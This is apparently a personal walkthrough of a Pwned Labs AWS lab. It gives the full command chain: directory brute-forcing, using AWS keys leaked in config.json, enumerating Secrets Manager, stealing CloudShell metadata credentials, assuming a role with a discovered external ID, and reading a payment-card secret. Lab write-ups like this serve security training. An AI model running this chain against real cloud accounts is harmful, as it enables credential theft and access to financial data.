https://pwnedlabs.io/labs/assume-privileged-role-with-external-id

`AssumeRole` is similar to `sudo`

We find the email address `info@hugelogistics.com` and infer the domain name for the website is `hugelogistics.com`
	Update `/etc/hosts`

No buckets exposed when we inspect the source code, so we `feroxbuster`
```bash
feroxbuster -k -u http://52.0.51.234/ -w /opt/lists/seclists/Discovery/Web-Content/raft-large-directories.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200
...SNIP...
200      GET       20l       36w      832c http://52.0.51.234/config.json
...SNIP...
```

The `config.json` directory exposes AWS secrets! Configure a new AWS profile:
```bash
aws configure --profile client-huge
aws sts get-caller-identity --profile client-huge                      # `data-bot` user
```

The `config.json` also references an s3 bucket named `hl-data-download`. We can list that and download:
```bash
aws s3 ls hl-data-download --profile client-huge
aws s3 cp s3://hl-data-download/LOG-1-TRANSACT.csv . --profile client-huge
```

Next, use the `aws-enumerator` tool to automate the process of enumerating our permissions against the AWS service.
```bash
go install -v github.com/shabarkin/aws-enumerator@latest
aws-enumerator cred                # Set our keys, or `~/go/bin/aws-enumerator cred`. Specify `-aws_region`, `-aws_access_key_id`, `aws_secret_access_key`, and `-aws_session_token`. Saved to `.env`
aws-enumerator enum -services all
aws-enumerator dump -services secretsmanager
```

Output shows us that we have `secretsmanager:ListSecrets` permission. We can now use `aws` to list the Huge Logistics secrets:
```bash
aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json --profile client-huge
	employee-database-admin   
	employee-database
	ext/cost-optimization
	billing/hl-default-payment                         # Flag here
```

The output of this command shows the names of secrets. We can then try to get the secret value of each id:
```bash
aws secretsmanager get-secret-value --secret-id employee-database-admin --profile client-huge              # Access Denied
aws secretsmanager get-secret-value --secret-id employee-database --profile client-huge                    # Access Denied
aws secretsmanager get-secret-value --secret-id ext/cost-optimization --profile client-huge                # Access Granted
aws secretsmanager get-secret-value --secret-id billing/hl-default-payment --profile client-huge           # Access Denied
```

The `ext/cost-optimization` secrets reveals a secret! It appears to be a username and password for a 3rd party AWS cost-optimization partner. Now, we can use the Account ID, Username, and Password to log into the AWS console. 

Now, manual enumeration of permissions is a lot. Let's use a Cloud Shell to generate credentials (*Expires in 15 minutes by default*).
```bash
# CloudShell
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

Add to a new profile:
```bash
aws configure --profile ext-cost
aws sts get-caller-identity --profile ext-cost
```

Enumerate permissions of the `ext-cost-user` IAM user and policy versions:
```bash
aws iam list-attached-user-policies --user-name ext-cost-user --profile ext-cost
	ExtCloudShell
		...
	ExtPolicyTest
		...
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --profile ext-cost
	...
	"v4"
	...
```

Receive the policy document to reveal AWS permissions allowing the 3rd party partner (and us) to confirm policies in place for their IAM user and a role named `External CostOptimizeAccess`:
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --profile ext-cost
```

This role reveals our current user (`ext-cost-user`) is trusted to assume the `ExternalCostOptimizeAccess` role and get access to whatever privileges are assigned. With the next command, we find the policy `Payment` is attached to this role and uses `v2`:
```bash
aws iam get-role --role-name ExternalCostOpimizeAccess --profile ext-cost
	...
	Condition:
	"ExternalId": "37911"
	...
aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess --profile ext-cost
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment --profile ext-cost
	...
	"v2"
	...
```

Retrieving the JSON document for this policy reveals that this role has access to the default payment card used by the company! We can leverage our resource control to access it.
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Payment --version-id v2 --profile ext-cost
```

However, assuming the role is unsuccessful:
```bash
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --profile -ext-cost
```

Looking back at the trust policy for the role, we see a condition that we must provide the External ID when assuming the role.
```bash
aws iam get-role --role-name ExternalCostOpimizeAccess --profile ext-cost
	...
	Condition:
	"ExternalId": "37911"
	...
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911 --profile ext-cost
```

This works and reveals the AWS credentials for the role. Set the keys and token:
```bash
aws configure --profile ECOA
aws sts get-caller-identity --profile ECOA
```

Now, let's get that CC info:
```bash
aws secretsmanager get-secret-value --secret-id billing/hl-default-payment --profile ECOA       
```
![[Pasted image 20260604105411.png]]